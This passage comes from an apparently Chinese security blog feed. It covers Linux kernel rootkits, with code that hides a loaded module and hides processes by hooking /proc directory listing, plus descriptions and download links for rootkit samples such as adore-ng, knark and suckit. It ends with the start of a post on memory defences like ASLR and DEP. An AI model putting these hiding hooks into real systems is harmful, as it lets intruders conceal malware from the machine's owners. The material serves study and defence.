class=&quot;line&quot;&gt;    module_previous = THIS_MODULE-&amp;gt;&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;.prev;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    list_del(&amp;amp;THIS_MODULE-&amp;gt;&lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    module_kobj_previous = THIS_MODULE-&amp;gt;mkobj.kobj.entry.prev;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    kobject_del(&amp;amp;THIS_MODULE-&amp;gt;mkobj.kobj);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    list_del(&amp;amp;THIS_MODULE-&amp;gt;mkobj.kobj.entry);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    module_hidden = !module_hidden;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;有关LKM模块隐藏还可参考： &lt;a href=&quot;http://www.freebuf.com/articles/system/54263.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Rootkit系列一：LKM的基础编写及隐藏&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x7-Example-Process-Hiding&quot;&gt;&lt;a href=&quot;#0x7-Example-Process-Hiding&quot; class=&quot;headerlink&quot; title=&quot;0x7: Example-Process Hiding&quot;&gt;&lt;/a&gt;0x7: Example-Process Hiding&lt;/h3&gt;&lt;p&gt;上文提到，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果。&lt;br&gt;以下是基于/proc目录读取函数劫持的进程隐藏代码：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;proc_readdir_new&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; file *filp, &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *dirent, filldir_t filldir)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    proc_filldir_orig = filldir;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return proc_readdir_orig(filp, dirent, proc_filldir_new);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//CALLBACK SECTION&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;proc_filldir_new&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *buf, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; namelen, loff_t offset, u64 ino, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; d_type)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; current_pid; i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        当检测到指定的需要隐藏的进程时，直接returned返回，即直接跳过这个进程的枚举&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(name, pids_to_hide[i])) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(name, &lt;span class=&quot;string&quot;&gt;&quot;rtkit&quot;&lt;/span&gt;)) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;0x8-Rootkit-Sample&quot;&gt;&lt;a href=&quot;#0x8-Rootkit-Sample&quot; class=&quot;headerlink&quot; title=&quot;0x8: Rootkit Sample&quot;&gt;&lt;/a&gt;0x8: Rootkit Sample&lt;/h3&gt;&lt;p&gt;1). adore-ng(lkm)。adore-ng不修改系统调用层的内容，而是通过修改VFS（Virtual Filesystem Switch)层的具体处理函数，如替换VFS层的 file_ops等函数，来实现信息隐藏目的。原理细节可参考：&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3879961.html#commentform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;adore-ng learning&lt;/a&gt;. 下载： &lt;a href=&quot;https://packetstormsecurity.com/files/32843/adore-ng-0.41.tgz.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;adore-ng 0.41&lt;/a&gt;, &lt;a href=&quot;https://github.com/chonghw/adore-ng&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;adore-ng github for linux 2.6 and 3.x&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2). knark(Hooking system call). 行为：隐藏或显示文件或目录； 隐藏TCP或UDP连接；程序执行重定向；非授权地用户权限增加(“rootme”)； 改变一个运行进程的UID/GID的工具；非授权地、特权程序远程执行守护进程(后门端口)；Kill –31: 隐藏运行的进程；调用表修改: rootkit通过修改导出的系统调用表，对与攻击行为相关的系统调用进行替换，隐藏攻击者的行踪。 原理细节可参考： &lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3879961.html#commentform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;kark learning&lt;/a&gt; .下载：&lt;a href=&quot;https://packetstormsecurity.com/files/24853/knark-2.4.3.tgz.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;knark download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3).suckit(DKOM). 行为：采用动态隐藏的方式来隐藏指定的内容，包括文件、进程、以及网络连接。suckit不同于其它基于lkm的hooking rootkit，没有修改系统调用表的内容，而是首先拷贝了系统调用表，然后将拷贝的系统调用表按照攻击者的意图进行修改执行攻击者改写的系统调用响应函数,然后将system_call（INT 80服务程序)从旧的系统调用表上移开，指向新的系统调用表. 有关suckit原理详细介绍，可参考: &lt;a href=&quot;http://www.hacker.com.cn/uploadfile/2013/0416/20130416020443596.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;suckit learning&lt;/a&gt;。  下载：&lt;a href=&quot;https://packetstormsecurity.com/files/40690/suckit2priv.tar.gz.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;suckit download&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其它rootkit samples还包括：&lt;a href=&quot;https://github.com/David-Reguera-Garcia-Dreg/enyelkm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;enyelkm&lt;/a&gt;,&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3879961.html#commentform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wnps&lt;/a&gt;, &lt;a href=&quot;https://github.com/cloudsec/brootkit&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;brootkit&lt;/a&gt;,(其中brootkit详细介绍可参考&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/4321826.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;brookit analysis&lt;/a&gt;),  &lt;a href=&quot;https://packetstormsecurity.com/files/128945/Xingyiquan-Linux-2.6.x-3.x-Rootkit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;xingyiquan&lt;/a&gt;,&lt;a href=&quot;https://packetstormsecurity.com/files/24482/Synapsys-lkm.tar.gz.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;synapsys&lt;/a&gt;, &lt;a href=&quot;http://average-coder.blogspot.com/2011/12/linux-rootkit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Average coder analysis&lt;/a&gt;, &lt;a href=&quot;https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Average coder download&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x9-Rootkit-Resources&quot;&gt;&lt;a href=&quot;#0x9-Rootkit-Resources&quot; class=&quot;headerlink&quot; title=&quot;0x9: Rootkit Resources&quot;&gt;&lt;/a&gt;0x9: Rootkit Resources&lt;/h3&gt;&lt;p&gt;列出一些rootkit学习相关资源，也是本文参考的主要来源，详见References。 rootkit出于本身恶意的原因，sample并不是那么好找，本文列出一些用于Research目的的malware站点，以便大家参考。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&gt;&amp;gt;Malware Research Source&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;http://contagiodump.blogspot.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://contagiodump.blogspot.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://zeltser.com/combating-malicious-software/malware-sample-sources.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zeltser.com/combating-malicious-software/malware-sample-sources.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://forums.malwarebytes.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://forums.malwarebytes.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.offensivecomputing.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.offensivecomputing.net/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/compatible/requirements.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://cve.mitre.org/compatible/requirements.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://packetstormsecurity.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://packetstormsecurity.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://github.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&quot;0xA-Acknowledgement&quot;&gt;&lt;a href=&quot;#0xA-Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;0xA: Acknowledgement&quot;&gt;&lt;/a&gt;0xA: Acknowledgement&lt;/h3&gt;&lt;p&gt;本文有许多知识来源于 Phd shiqing以及新浪微博用户@Littlehann 两位大神的指点。&lt;/p&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/03/07/rootkit-tutorial/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/03/07/rootkit-tutorial/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/diting0x/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;0xB-References&quot;&gt;&lt;a href=&quot;#0xB-References&quot; class=&quot;headerlink&quot; title=&quot;0xB: References&quot;&gt;&lt;/a&gt;0xB: References&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://www.ists.dartmouth.edu/library/409.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Detecting kernel rootkits&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.usenix.org/legacy/event/hotbots07/tech/full_papers/chiang/chiang_html/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;A Case Study of the Rustock Rootkit and Spam Bot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.invisiblethings.org/papers/2006/rutkowska_malware_taxonomy.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Introducing Stealth Malware Taxonomy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cs.rutgers.edu/~iftode/SystemicThreats07.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kernel rootkit classification&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3870974.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Rootkit Learning&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3910696.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Rootkit Hacking Technology &amp;amp;&amp;amp; Defence Strategy Research&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/58/6.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Advances in Kernel Hacking&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://althing.cs.dartmouth.edu/local/vsc07.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Runtime kernel kmem patching&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/presentations/bh-europe-09/Lineberry/BlackHat-Europe-2009-Lineberry-code-injection-via-dev-mem.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Malicious Code Injection via /dev/mem&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://turbochaos.blogspot.hk/2013/10/writing-linux-rootkits-301_31.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Modern Linux Rootkits 301 - Bypassing modules_disabled security&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/59/4.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Handling Interrupt Descriptor Table for fun and profit:&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/61/7.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hijacking Linux Page Fault Handler: Exception Table&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/61/14.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kernel Rootkit Experiences&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/65/8.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Mistifying the debugger&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.thc.org/papers/LKM_HACKING.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Complete Linux Loadable Kernel Modules&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/52/18.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Weakening the Linux Kernel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/system/54263.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Rootkit系列一：LKM的基础编写及隐藏&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://ab-rtfm.blogspot.com/2007/07/explorations-with-adore-ng.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Explorations with adore-ng&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3879961.html#commentform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Rootkit Sample &amp;amp;&amp;amp; Rootkit Defenser Analysis&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.hacker.com.cn/uploadfile/2013/0416/20130416020443596.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Suckit技术原理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;http://labs.lastline.com/high-resolution-dynamic-analysis-of-windows-kernel-rootkits&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;High-Resolution Dynamic Analysis of Windows Kernel Rootkits&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://labs.lastline.com/dissecting-turla-rootkit-malware-using-dynamic-analysis&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dissecting Turla Rootkit Malware Using Dynamic Analysis&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://securityintelligence.com/detecting-and-analyzing-kernel-based-malware/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Detecting and Analyzing Kernel-Based Malware&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://phrack.org/issues/58/7.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;suckit: Linux on-the-fly kernel patching without LKM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://la-samhna.de/library/rootkits/basics.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux Kernel Rootkits&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.symantec.com/avcenter/reference/when.malware.meets.rootkits.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;When Malware Meets Rootkits&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3854977.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux System Calls Hooking Method Summary&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://opensecuritytraining.info/Rootkits.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://opensecuritytraining.info/Rootkits.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.linux-magazine.com/Online/Features/Kernel-Rootkit-Tricks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Kernel Rootkit Tricks&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;0x1: Definition of rootkit &lt;/li&gt;
&lt;li&gt;0x2: Classification of Rootkit&lt;/li&gt;
&lt;li&gt;0x3: Hooking(Kernel Object Hooking) Rootkit&lt;/li&gt;
&lt;li&gt;0x4: DKOM Rootkit&lt;/li&gt;
&lt;li&gt;0x5: Rootkit Objectives&lt;/li&gt;
&lt;li&gt;0x6: Example-Module Hiding&lt;/li&gt;
&lt;li&gt;0x7: Example-Process Hiding&lt;/li&gt;
&lt;li&gt;0x8: Rootkit Samples&lt;/li&gt;
&lt;li&gt;0x9: Rootkit Resources&lt;/li&gt;
&lt;li&gt;0xA: Acknowledgement&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="rootkit" scheme="http://yoursite.com/categories/rootkit/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
      <category term="Rootkit" scheme="http://yoursite.com/tags/Rootkit/"/>
    
      <category term="Malware" scheme="http://yoursite.com/tags/Malware/"/>
    
      <category term="Kernel" scheme="http://yoursite.com/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>内存持久战-防御机制</title>
    <link href="http://yoursite.com/blog/2016/02/23/memorywar-defense/"/>
    <id>http://yoursite.com/blog/2016/02/23/memorywar-defense/</id>
    <published>2016-02-23T16:54:07.000Z</published>
    <updated>2016-04-21T20:54:57.000Z</updated>
    
    <content type="html">&lt;p&gt;继前两篇文章 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-内存安全性&lt;/a&gt;, &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-攻击模型&lt;/a&gt;, 再加上防御措施，才能算是完整的内存战争。本文首先介绍目前广泛部署的防御机制，然后根据 &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;内存持久战-攻击模型&lt;/a&gt; 每一步实施的攻击破坏介绍相对应的防御细节。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;广泛部署的防御机制&quot;&gt;&lt;a href=&quot;#广泛部署的防御机制&quot; class=&quot;headerlink&quot; title=&quot;广泛部署的防御机制&quot;&gt;&lt;/a&gt;广泛部署的防御机制&lt;/h3&gt;&lt;p&gt;目前广泛部署的防御机制有栈粉碎性保护（Stack smashing protection)，DEP/W⊕X以及ASLR(Address Space Layout Randomization)。针对Windows平台，也提出了一些特殊的机制，比如 SafeSEH 与 SEHOP 用来保护堆的元数据和异常处理器。&lt;/p&gt;
&lt;p&gt;栈粉碎性保护,SafeSEH以及SEHOP的基本思想是在返回地址与缓冲区(比如函数入口）之间放置随机数作为哨兵（称为cookie或canary),在函数返回前先检测哨兵的值是否被篡改，以达到检测缓冲区溢出攻击的目的。这些机制都属于代码指针保护方式（code pointer integrity),主要检测一些特殊代码指针，如栈上的返回地址、异常处理器指针的完整性，然而对于直接修改（比如索引错误）却无能为力。有关stack smashing 可参考这篇文章 &lt;a href=&quot;http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Anatomy of a Stack Smashing Attack and How GCC Prevents It
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;W⊕X（write XOR executable)属于DEP（data execution prevention)的子集，是不可执行数据（Non-executable data）与代码完整性(code integrity)的结合。所有现代CPU都支持设置不可执行页面权限，结合不可写代码权限，就可以实施W⊕X机制，很简单也很实际。然而无法防御ROP（return oriented programming),ROP指的是在将现有代码中的可复用代码（可以是现有的函数）以及一些指令序列（gadgets)连接起来实施恶意操作。有关ROP可参考这篇文章，&lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Return-oriented Programming:&lt;br&gt;Exploitation without Code Injection&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;ASLR在下文会详细描述。&lt;/p&gt;
&lt;h3 id=&quot;防御机制Step-by-step&quot;&gt;&lt;a href=&quot;#防御机制Step-by-step&quot; class=&quot;headerlink&quot; title=&quot;防御机制Step-by-step&quot;&gt;&lt;/a&gt;防御机制Step-by-step&lt;/h3&gt;&lt;p&gt;从目前提出的所有防御机制来看，可将其划分为两大类：概率性以及确定性防御。概率性机制用来随机化一些对象，如ISR(Instruction Set Randomization), ASLR(Address Space Layout Randomizatioin)以及DSR(Data Space Randomization),可选手段相对较少。 确定性防御机制实施reference monitor, 有关reference monitor的定义可参考，&lt;a href=&quot;https://en.wikipedia.org/wiki/Reference_monitor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wikipedia page on reference monior&lt;/a&gt;,主要就是在参考验证机制上定义了一些设计要求。 其主要利用静态与动态注入技术，静态注入可在编译阶段实施，动态注入需要在运行时加入代码，损耗相对较大。有关注入技术，可参考我前面的文章 &lt;a href=&quot;http://www.chongh.wiki/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PIN for Dynamic Binary Instrumentation&lt;/a&gt;。&lt;/p&gt;
